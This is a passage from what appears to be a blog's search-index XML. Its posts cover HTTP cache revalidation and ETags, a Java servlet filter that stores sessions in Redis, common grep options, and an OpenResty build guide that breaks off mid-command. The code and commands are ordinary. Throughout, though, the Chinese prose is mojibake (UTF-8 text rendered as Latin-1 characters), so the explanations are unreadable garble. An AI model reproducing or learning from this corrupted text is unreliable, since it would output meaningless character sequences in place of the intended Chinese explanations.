é¦–éƒ¨,å…¶ä¸­æºå¸¦æœ‰æœ€åä¿®æ”¹å·²ç¼“å­˜å‰¯ æœ¬çš„æ—¥æœŸ:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Modified-Since: &lt;cached last-modified date&gt;</span><br></pre></td></tr></table></figure><h3 id="æµè§ˆå™¨ç¼“å­˜å†éªŒè¯"><a href="#æµè§ˆå™¨ç¼“å­˜å†éªŒè¯" class="headerlink" title="æµè§ˆå™¨ç¼“å­˜å†éªŒè¯"></a>æµè§ˆå™¨ç¼“å­˜å†éªŒè¯</h3><ol><li><p>æ£€æŸ¥æœ¬åœ°æœ‰æ²¡æœ‰ç¼“å­˜ã€‚å¦‚æœæ²¡æœ‰ç›´æ¥å‘å‡ºè¯·æ±‚ï¼Œå¦‚æœæœ‰åˆ™æ£€æŸ¥ç¼“å­˜æ˜¯å¦è¿‡æœŸã€‚</p></li><li><p>æœåŠ¡å™¨ç”¨ HTTP&#x2F;1.0+ çš„ Expires é¦–éƒ¨æˆ– HTTP&#x2F;1.1 çš„ Cache-Control: max-age å“åº”é¦–éƒ¨æ¥æŒ‡å®šè¿‡æœŸæ—¥æœŸã€‚å¦‚æœå“åº”ä¸­æ²¡æœ‰ Cache-Control: max-age é¦–éƒ¨ï¼Œä¹Ÿæ²¡æœ‰ Expires é¦–éƒ¨ï¼Œç¼“å­˜å¯ä»¥è®¡ç®—å‡ºä¸€ä¸ª<code>è¯•æ¢æ€§æœ€å¤§ä½¿ç”¨æœŸ</code>ã€‚LM-Factor ç®—æ³•æ˜¯ä¸€ç§å¾ˆå¸¸ç”¨çš„è¯•æ¢æ€§è¿‡æœŸç®—æ³•ï¼Œç®—æ³•çš„é€»è¾‘å¦‚ä¸‹æ‰€ç¤ºã€‚</p><ul><li>å¦‚æœå·²ç¼“å­˜æ–‡æ¡£æœ€åä¸€æ¬¡ä¿®æ”¹å‘ç”Ÿåœ¨å¾ˆä¹…ä»¥å‰ï¼Œå®ƒå¯èƒ½ä¼šæ˜¯ä¸€ä»½ç¨³å®šçš„æ–‡æ¡£ï¼Œä¸ å¤ªä¼šçªç„¶å‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤å°†å…¶ç»§ç»­ä¿å­˜åœ¨ç¼“å­˜ä¸­ä¼šæ¯”è¾ƒå®‰å…¨ã€‚</li><li>å¦‚æœå·²ç¼“å­˜æ–‡æŒ¡æœ€è¿‘è¢«ä¿®æ”¹è¿‡ï¼Œå°±è¯´æ˜å®ƒå¾ˆå¯èƒ½ä¼šé¢‘ç¹åœ°å‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤åœ¨ä¸æœ åŠ¡å™¨è¿›è¡Œå†éªŒè¯ä¹‹å‰ï¼Œåªåº”è¯¥å°†å…¶ç¼“å­˜å¾ˆçŸ­ä¸€æ®µæ—¶é—´ã€‚<br> <a href="https://tools.ietf.org/html/rfc2616#section-13.2.2"><img src="/images/QQ20170505-140727@2x.jpg"></a><blockquote><p>è¿™ä¸ª <code>è¯•æ¢æ€§æœ€å¤§ä½¿ç”¨æœŸ</code> çš„å€¼å’Œæ–‡æ¡£ä¿®æ”¹æ—¥æœŸæœ‰å…³ï¼Œä¹Ÿå°±æ˜¯å“åº”å¤´ä¸­çš„ <code>Last-Modified</code> é¦–éƒ¨ã€‚å¦‚æœ <code>Last-Modified</code> æ—¥æœŸè·ä»Šæ¯”è¾ƒä¹…ï¼Œå°±ä¼šç®—å‡ºæ¥ä¸€ä¸ªæ¯”è¾ƒé•¿çš„ <code>è¯•æ¢æ€§æœ€å¤§ä½¿ç”¨æœŸ</code> ã€‚</p></blockquote></li></ul></li><li><p>å¦‚æœç¼“å­˜æ²¡æœ‰è¿‡æœŸï¼Œç›´æ¥ä½¿ç”¨ç¼“å­˜ï¼Œä¸å†å‘å‡ºè¯·æ±‚ã€‚å¦‚æœä»…ä»…æ˜¯å·²ç¼“å­˜æ–‡æ¡£è¿‡æœŸäº†å¹¶ä¸æ„å‘³ç€å®ƒå’ŒåŸå§‹æœåŠ¡å™¨ä¸Šç›®å‰å¤„äºæ´»è·ƒçŠ¶æ€çš„æ–‡æ¡£æœ‰å®é™…çš„åŒºåˆ«ï¼Œè¿™åªæ˜¯æ„å‘³ç€åˆ°äº†è¦è¿›è¡Œæ ¸å¯¹çš„æ—¶é—´äº†ã€‚è¿™ç§æƒ…å†µè¢«ç§°ä¸º<code>æœåŠ¡å™¨å†éªŒè¯</code>ï¼Œè¯´æ˜ç¼“å­˜éœ€è¦è¯¢é—®åŸå§‹æœåŠ¡å™¨æ–‡æ¡£æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ã€‚æœ€å¸¸è§çš„ç¼“å­˜å†éªŒè¯é¦–éƒ¨æ˜¯ If-Modified-Since å’Œ If-None-Match ã€‚If-Modified-Since ä¸ Last-Modified æœåŠ¡å™¨å“åº”é¦–éƒ¨é…åˆå·¥ä½œï¼ŒIf-None-Match ä¸ ETag æœåŠ¡å™¨å“åº”é¦–éƒ¨é…åˆå·¥ä½œã€‚å¦‚æœæœåŠ¡å™¨éªŒè¯æ–‡æ¡£æ²¡è¢«ä¿®æ”¹è¿‡ï¼Œæ¡ä»¶å°±ä¸ºå‡ï¼Œä¼šå‘å®¢æˆ·ç«¯è¿”å›ä¸€ä¸ªå°çš„ 304 Not Modified å“åº”æŠ¥æ–‡ï¼Œä¸ºäº†æé«˜æœ‰æ•ˆæ€§ï¼Œä¸ä¼šè¿”å›æ–‡æ¡£çš„ä¸»ä½“ã€‚å¦‚æœæ–‡æ¡£å‘—ä¿®æ”¹äº†ï¼ŒæœåŠ¡å™¨ä¼šåœ¨ä¸€ä¸ª 200 OK å“åº”ä¸­è¿”å›æ–°çš„å†…å®¹ä»¥åŠç›¸åº”çš„æ–° Last-Modified å’Œ Etagã€‚</p></li></ol><blockquote><p>æ­£å¸¸æƒ…å†µä¸‹æœåŠ¡å™¨éƒ½åº”è¯¥æ˜ç¡®æŒ‡å®šè¿‡æœŸæ—¶é—´ï¼Œå¦‚æœæ²¡æœ‰æä¾›è¿‡æœŸæ—¶é—´å¹¶ä¸”æä¾›äº† Last-Modified time æµè§ˆå™¨å°±ä¼šç»™æˆ‘ä»¬ç®—å‡ºæ¥ä¸€ä¸ªè¿‡æœŸæ—¶é—´ã€‚è¿™ä¸ªæ—¶é—´æ˜¯éšå¼çš„ï¼Œå†æ¬¡å‘å‡ºè¯·æ±‚æ—¶æµè§ˆå™¨å›å»æ ¹æ®è¿™ä¸ª <code>è¯•æ¢æ€§æœ€å¤§ä½¿ç”¨æœŸ</code> æ£€æŸ¥æ–‡æ¡£æ˜¯å¦è¿‡æœŸã€‚å¦‚æœæ²¡æœ‰è¿‡æœŸï¼Œå°±ä¸ä¼šå†è¿›è¡Œ revalidated ï¼Œæˆ‘ä»¬ä¹Ÿå°±ä¸ä¼šçœ‹åˆ°å‘å‡ºè¯·æ±‚å“åº” 304 çš„æƒ…å†µï¼ˆ304 æ˜¯è¿›è¡Œåœ¨éªŒè¯çš„ç»“æœï¼‰ã€‚å¦‚æœæˆ‘ä»¬å¸Œæœ›æµè§ˆå™¨éƒ½å›å»æœåŠ¡å™¨è¿›è¡Œ revalidatedï¼Œå¯ä»¥è®¾ç½®å“åº”å¤´ <code>Cache-Control: max-age=0</code>ã€‚</p></blockquote><p><a href="https://tools.ietf.org/html/rfc2616#section-13.2.6"><img src="/images/QQ20170505-142938@2x.jpg"></a></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>ã€ŠHTTPæƒå¨æŒ‡å—ã€‹ ã€Šå›¾è§£HTTPã€‹</p><p><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn">Google developers HTTP ç¼“å­˜</a><br><a href="https://tools.ietf.org/html/rfc2616#section-13.2.2">Heuristic Expiration</a><br><a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.2.6">revalidate cache use Cache-Control</a><br><a href="https://jakearchibald.com/2016/caching-best-practices/">Caching best practices</a><br><a href="http://www.alloyteam.com/2016/03/discussion-on-web-caching/">æµ…è°ˆWebç¼“å­˜</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-redis-session.md</title>
      <link href="/post/java-redis-session.html"/>
      <url>/post/java-redis-session.html</url>
      
        <content type="html"><![CDATA[<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>å¾ˆå¤šæ—¶å€™æœåŠ¡å™¨éœ€è¦ç”¨é›†ç¾¤çš„æ–¹å¼è¿›è¡Œéƒ¨ç½²ï¼Œè¿™ç§æƒ…å†µæœ‰æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦è§£å†³ï¼Œé‚£å°±æ˜¯Sessionã€‚æ ¹æ®Java EEè§„èŒƒï¼ŒHttpSessioné»˜è®¤æ˜¯ç”±å„ä¸ªå‚å•†è‡ªå·±æ¥å®ç°çš„ã€‚ä¾‹å¦‚Tomcaté»˜è®¤çš„HttpSessionå°±æ˜¯ç”¨ç”¨Mapæ¥å®ç°çš„ã€‚è¿™ç§é»˜è®¤çš„å®ç°åœ¨é›†ç¾¤ç¯å¢ƒä¸­æœ‰å¾ˆå¤§çš„é—®é¢˜ï¼Œæ— æ³•å®ç°Sessionå…±äº«ã€‚è¿™ç§åº”ç”¨å†…Sessionæœ‰ä¸ªå¾ˆå¤§çš„é—®é¢˜æ˜¯Sessionå¤ªå¤šæ—¶ä¼šå ç”¨å¤ªå¤šçš„å †å†…å­˜ï¼Œåˆç†çš„æ€è·¯æ˜¯åº”è¯¥æ‰¾ä¸“ä¸šçš„ç¬¬ä¸‰æ–¹ç¼“å­˜æ¥å­˜æ”¾Sessionã€‚<br>å¾ˆå¤šåº”ç”¨ç°åœ¨éƒ½åœ¨ä½¿ç”¨Redisæˆ–è€…Memcacheæ¥åšç¼“å­˜ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠSessionæ”¾åˆ°è¿™ç§ä¸“ä¸šç¼“å­˜ä¸­ã€‚</p><p>å¦‚ä½•æ”¾è¿›å»ï¼Ÿè¿™æ˜¯ä¸ªé—®é¢˜ã€‚</p><p>æœ‰ä¸€ä¸ªç±»å«åš<code>HttpServletRequestWrapper</code>ï¼Œä¸€çœ‹è¿™ä¸ªåå­—å°±çŸ¥é“å®ƒä½¿ç”¨çš„æ˜¯è£…é¥°å™¨æ¨¡å¼ã€‚æˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œå…¥æ‰‹æ¥ç”¨ç¬¬ä¸‰æ–¹ç¼“å­˜æ¥å­˜å‚¨Sessionã€‚æˆ‘ä»¬é€šè¿‡æ‹¦æˆªå™¨æ¥æŠŠåŒ…è£…åŸæ¥çš„<code>HttpServletRequest</code>å’Œ<code>HttpServletResponse</code>å®ç°ã€‚<br><img src="/images/QQ20160829-0@2x.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    request = <span class="keyword">new</span> <span class="title class_">HttpServletRedisRequest</span>((HttpServletRequest) request);</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">HttpServletRedisResponse</span>((HttpServletResponse) response, (HttpServletRequest) request);</span><br><span class="line"></span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘ä»¬å¯ä»¥åœ¨Filterä¸­çš„<code>init</code>æ–¹æ³•ä¸­åˆå§‹åŒ–Redisè¿æ¥æ± ï¼Œåœ¨<code>destroy</code>æ–¹æ³•ä¸­é”€æ¯è¿æ¥</p></blockquote><p>åœ¨<code>HttpServletRedisRequest</code>é‡Œé¢æˆ‘ä»¬é‡å†™getSessionæ–¹æ³•ï¼Œæ›¿æ¢æˆè‡ªå·±çš„Sessionå®ç°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServletRedisRequest</span> <span class="keyword">extends</span> <span class="title class_">HttpServletRequestWrapper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="keyword">private</span> String sid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a request object wrapping the given request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if the request is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HttpServletRedisRequest</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(request);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.request = request;</span><br><span class="line">        <span class="built_in">this</span>.sid = request.getHeader(TOKEN_HEADER_NAME);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpSession <span class="title function_">getSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getSession(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpSession <span class="title function_">getSession</span><span class="params">(<span class="type">boolean</span> create)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sid != <span class="literal">null</span> &amp;&amp; sid.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> sessionManage.get(sid, <span class="built_in">this</span>.getServletContext());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (create) &#123;</span><br><span class="line">            <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> sessionManage.newSession(<span class="built_in">this</span>.getServletContext());</span><br><span class="line">            <span class="built_in">this</span>.sid = session.getId();</span><br><span class="line">            <span class="keyword">return</span> session;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRequestedSessionId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(String name, Object o)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.setAttribute(name, o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨<code>HttpServletRedisResponse</code>ä¸­ï¼ŒæŠŠSessionIDæ”¾åˆ°å“åº”å¤´æˆ–è€…Cookieä¸­å“åº”ç»™æµè§ˆå™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServletRedisResponse</span> <span class="keyword">extends</span> <span class="title class_">HttpServletResponseWrapper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;    </span><br><span class="line">    <span class="keyword">private</span> HttpServletResponse response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HttpServletRedisResponse</span><span class="params">(HttpServletResponse response, HttpServletRequest request)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(response);</span><br><span class="line">       <span class="built_in">this</span>.request = request;</span><br><span class="line">       <span class="built_in">this</span>.response = response;</span><br><span class="line"></span><br><span class="line">       response.setHeader(TOKEN_HEADER_NAME, request.getRequestedSessionId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è£…é¥°å™¨æ¨¡å¼è¯¦è§£"><a href="#è£…é¥°å™¨æ¨¡å¼è¯¦è§£" class="headerlink" title="è£…é¥°å™¨æ¨¡å¼è¯¦è§£"></a>è£…é¥°å™¨æ¨¡å¼è¯¦è§£</h3><p>è¿™é‡Œçš„tomcatçš„HttpRequestå®ç°æ˜¯<code>org.apache.catalina.connector.RequestFacade</code>ï¼Œè¿™ä¸ªç±»å®ç°äº†<code>HttpServletRequest</code>æ¥å£ã€‚<br>åœ¨<code>HttpServletRequestWrapper</code>ç±»ä¸­ç»´æŠ¤äº†ä¸€ä¸ªè¦åŒ…è£…çš„requestå¯¹è±¡ï¼Œè€Œ<code>HttpServletRequestWrapper</code>ç±»å®ç°äº†<code>HttpServletRequest</code>æ¥å£ã€‚åœ¨<code>HttpServletRequestWrapper</code>çš„å®ç°ä¸­ï¼Œé»˜è®¤éƒ½æ˜¯è°ƒç”¨åŒ…è£…å¯¹è±¡çš„æ–¹æ³•ã€‚æˆ‘ä»¬åˆ›å»ºçš„åŒ…è£…ç±»ç»§æ‰¿äº†<code>HttpServletRequestWrapper</code>ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬é‡å†™äº†<code>getSession</code>æ–¹æ³•ï¼Œè¿™é‡Œå½“æˆ‘ä»¬è°ƒç”¨<code>getSession</code>æ–¹æ³•æ—¶ä¼šè°ƒç”¨è‡ªå·±å†™çš„å®ç°ã€‚å½“æˆ‘ä»¬è°ƒç”¨å…¶å®ƒæ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨çˆ¶ç±»<code>HttpServletRequestWrapper</code>å®ç°ï¼Œè€Œåœ¨çˆ¶ç±»ä¸­æ–¹æ³•çš„å®ç°å´æ˜¯è°ƒç”¨çš„è¢«åŒ…è£…ç±»çš„å®ç°ã€‚è¿™æ ·å°±å®ç°äº†è¢«åŒ…è£…å¯¹è±¡çš„å¢å¼ºã€‚</p><p>è¿™é‡Œçš„æ ¸å¿ƒæ˜¯ï¼Œè¿™ä¸ªåŒ…è£…ç±»ã€‚å®ƒå’Œè¢«åŒ…è£…å¯¹è±¡å®ç°åŒä¸€ä¸ªæ¥å£ï¼Œåœ¨ä»–å†…éƒ¨å¼•ç”¨äº†ä¸€ä¸ªè¢«åŒ…è£…å¯¹è±¡ã€‚é»˜è®¤é¦–å…ˆæ˜¯è°ƒç”¨çš„è¢«åŒ…è£…å¯¹è±¡çš„å®ç°ï¼Œå½“å­ç±»é‡å†™åŒ…è£…ç±»æ—¶ï¼Œè¿™æ—¶åœ¨è°ƒç”¨å°±åŠ å…¥äº†è‡ªå®šä¹‰çš„å®ç°ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux-grep.md</title>
      <link href="/post/linux-grep.html"/>
      <url>/post/linux-grep.html</url>
      
        <content type="html"><![CDATA[<h3 id="grepå¸¸ç”¨ç”¨æ³•"><a href="#grepå¸¸ç”¨ç”¨æ³•" class="headerlink" title="grepå¸¸ç”¨ç”¨æ³•"></a>grepå¸¸ç”¨ç”¨æ³•</h3><p>[root@www ~]# grep [-acinv] [â€“color&#x3D;auto] â€˜æœå¯»å­—ç¬¦ä¸²â€™ filename<br>é€‰é¡¹ä¸å‚æ•°ï¼š<br>-a ï¼šå°† binary æ–‡ä»¶ä»¥ text æ–‡ä»¶çš„æ–¹å¼æœå¯»æ•°æ®<br>-c ï¼šè®¡ç®—æ‰¾åˆ° â€˜æœå¯»å­—ç¬¦ä¸²â€™ çš„æ¬¡æ•°<br>-i ï¼šå¿½ç•¥å¤§å°å†™çš„ä¸åŒï¼Œæ‰€ä»¥å¤§å°å†™è§†ä¸ºç›¸åŒ<br>-n ï¼šé¡ºä¾¿è¾“å‡ºè¡Œå·<br>-v ï¼šåå‘é€‰æ‹©ï¼Œäº¦å³æ˜¾ç¤ºå‡ºæ²¡æœ‰ â€˜æœå¯»å­—ç¬¦ä¸²â€™ å†…å®¹çš„é‚£ä¸€è¡Œï¼<br>â€“color&#x3D;auto ï¼šå¯ä»¥å°†æ‰¾åˆ°çš„å…³é”®è¯éƒ¨åˆ†åŠ ä¸Šé¢œè‰²çš„æ˜¾ç¤ºå–”ï¼   </p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><p>æ˜¾ç¤ºè¡Œå·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -n root /etc/passwd</span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºä¸Šä¸‹ä¸¤è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep  -C 2 root /etc/passwd</span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºå‰äº”è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -B 2 root /etc/passwd  </span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºåä¸¤è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -A 2 root /etc/passwd  </span><br></pre></td></tr></table></figure><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><ol><li><a href="http://blog.sina.com.cn/s/blog_716844910100tfxv.html">Linuxä¸­æŸ¥çœ‹æ–‡ä»¶æ—¶æ˜¾ç¤ºè¡Œå·</a></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/ggjucheng/archive/2013/01/13/2856896.html">ã€1ã€‘</a><a href="http://www.cnblogs.com/mfryf/p/3336288.html">ã€2ã€‘</a> <a href="http://blog.sina.com.cn/s/blog_716844910100tfxv.html">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>etag</title>
      <link href="/post/etag.html"/>
      <url>/post/etag.html</url>
      
        <content type="html"><![CDATA[<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>æœ‰ä¸€æ¬¡æŸ¥çœ‹æµè§ˆå™¨æ§åˆ¶å°ï¼Œå‘ç°å¥½å¤šå“åº”ç éƒ½æ˜¯304ã€‚æˆ‘ä»¬åå°ç”¨çš„Express.jsï¼Œä¸€èˆ¬å“åº”çš„æ—¶å€™æ²¡æœ‰åšä»€ä¹ˆç‰¹æ®Šçš„æ“ä½œã€‚é‚£é»˜è®¤æƒ…å†µä¸‹åº”è¯¥æ˜¯200å•Šã€‚<br>æŸ¥çœ‹expressçš„æºç </p><h3 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h3><p>Not Modified å®¢æˆ·ç«¯æœ‰ç¼“å†²çš„æ–‡æ¡£å¹¶å‘å‡ºäº†ä¸€ä¸ªæ¡ä»¶æ€§çš„è¯·æ±‚ï¼ˆä¸€èˆ¬æ˜¯æä¾›If-Modified-Sinceå¤´è¡¨ç¤ºå®¢æˆ·åªæƒ³æ¯”æŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡æ¡£ï¼‰ã€‚æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ï¼ŒåŸæ¥ç¼“å†²çš„æ–‡æ¡£è¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ã€‚</p><h3 id="etagå’Œ304"><a href="#etagå’Œ304" class="headerlink" title="etagå’Œ304"></a>etagå’Œ304</h3>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> etag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>install-openresty</title>
      <link href="/post/install-openresty.html"/>
      <url>/post/install-openresty.html</url>
      
        <content type="html"><![CDATA[<h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p><a href="https://openresty.org/">OpenResty</a>æ˜¯ä¸€ä¸ªå«<a href="https://github.com/openresty/lua-nginx-module">lua-nginx-module</a>çš„nginxæ¨¡å—å‘å±•æ¥çš„ï¼Œè¿™ä¸ªæ¨¡å—èƒ½è®©æˆ‘ä»¬åœ¨configæ–‡ä»¶ä¸­ç¼–å†™luaè„šæœ¬æ¥æ„å»ºWebåº”ç”¨ç³»ç»Ÿã€‚OpenRestyå¯ä»¥è®©ä½ çš„WebæœåŠ¡ç›´æ¥è·‘åœ¨ Nginx æœåŠ¡å†…éƒ¨ã€‚</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><h4 id="LinuxåŒ…å®‰è£…"><a href="#LinuxåŒ…å®‰è£…" class="headerlink" title="LinuxåŒ…å®‰è£…"></a>LinuxåŒ…å®‰è£…</h4><p><a href="https://openresty.org/cn/linux-packages.html">å‚è€ƒ</a></p><h4 id="ä½œä¸ºnginxæ¨¡å—å®‰è£…"><a href="#ä½œä¸ºnginxæ¨¡å—å®‰è£…" class="headerlink" title="ä½œä¸ºnginxæ¨¡å—å®‰è£…"></a>ä½œä¸ºnginxæ¨¡å—å®‰è£…</h4><p>å‡†å¤‡</p><ol><li><a href="http://luajit.org/download.html">ä¸‹è½½</a>LuaJIT</li><li><a href="https://github.com/simpl/ngx_devel_kit/tags">ä¸‹è½½</a>æœ€æ–°çš„<code>ngx_devel_kit</code>æ¨¡å—</li><li><a href="https://github.com/openresty/lua-nginx-module/tags">ä¸‹è½½</a>æœ€æ–°çš„<code>lua-nginx-module</code>æ¨¡å—</li><li><a href="http://nginx.org/">ä¸‹è½½</a>æœ€æ–°çš„nginx</li></ol><p>å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¼–è¯‘luajit</span><br><span class="line">tar zxvf LuaJIT-2.0.2.tar.gz</span><br><span class="line"></span><br><span class="line">cd LuaJIT-2.0.2</span><br><span class="line"></span><br><span class="line">make install PREFIX=/usr/local/luajit</span><br><span class="line">echo &quot;/usr/local/luajit/lib&quot; &gt; /etc/ld.so.conf.d/usr_local_luajit_lib.conf</span><br><span class="line"></span><br><span class="line">ldconfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># é…ç½®luajitç¯å¢ƒå˜é‡</span><br><span class="line">export LUAJIT_LIB=/usr/local/luajit/lib</span><br><span class="line"></span><br><span class="line">export LUAJIT_INC=/usr/local/luajit/include/luajit-2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ç¼–è¯‘nginx</span><br><span class="line"></span><br><span class="line">./configure \</span><br><span class="line">    